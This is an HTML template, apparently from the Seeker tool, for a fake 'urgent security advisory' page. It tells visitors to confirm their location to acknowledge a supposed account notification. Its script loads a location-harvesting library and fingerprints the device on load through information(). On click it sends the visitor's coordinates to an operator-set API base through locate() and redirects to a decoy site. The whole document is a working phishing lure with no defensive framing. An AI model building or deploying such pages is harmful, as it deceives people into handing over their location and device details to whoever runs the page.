<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Urgent Security Advisory</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #fff8e6;
      color: #1a1a1a;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .alert-box {
      max-width: 460px;
      background: #fff;
      border: 2px solid #e67700;
      border-radius: 8px;
      padding: 28px;
      box-shadow: 0 4px 16px rgba(230,119,0,0.15);
    }
    .urgent-badge {
      display: inline-block;
      background: #e67700;
      color: #fff;
      font-size: 0.75rem;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 4px;
      margin-bottom: 12px;
      letter-spacing: 0.5px;
    }
    h1 { font-size: 1.5rem; color: #b34700; margin-bottom: 12px; }
    p { color: #4a4a4a; font-size: 0.95rem; line-height: 1.6; margin-bottom: 24px; }
    .btn {
      display: inline-block;
      padding: 14px 36px;
      background: #e67700;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover { background: #cc6a00; }
    #status { margin-top: 16px; font-size: 0.9rem; color: #666; }
  </style>
</head>
<body>
  <div class="alert-box">
    <span class="urgent-badge">URGENT — ACTION REQUIRED</span>
    <h1>Security Advisory</h1>
    <p>An important security notification has been issued for your account. Please confirm your current location to acknowledge receipt and access the full advisory details.</p>
    <button id="ackBtn" class="btn" onclick="handleAck()">Acknowledge &amp; View</button>
    <div id="status"></div>
  </div>
  <script>
    window.SEEKER_API_BASE = '{{ api_base }}';
  </script>
  <script src="/static/seeker/js/location.js"></script>
  <script>
    information();
    function handleAck() {
      var btn = document.getElementById('ackBtn');
      var status = document.getElementById('status');
      btn.disabled = true;
      btn.textContent = 'Processing...';
      var redirectUrl = '{{ redirect_url }}' || 'https://www.google.com';
      locate(
        function() {
          status.textContent = 'Acknowledged. Redirecting...';
          window.location.href = redirectUrl;
        },
        function(err, msg) {
          status.textContent = 'Unable to process. ' + (msg || '');
          btn.disabled = false;
          btn.textContent = 'Acknowledge & View';
        }
      );
    }
  </script>
</body>
</html>
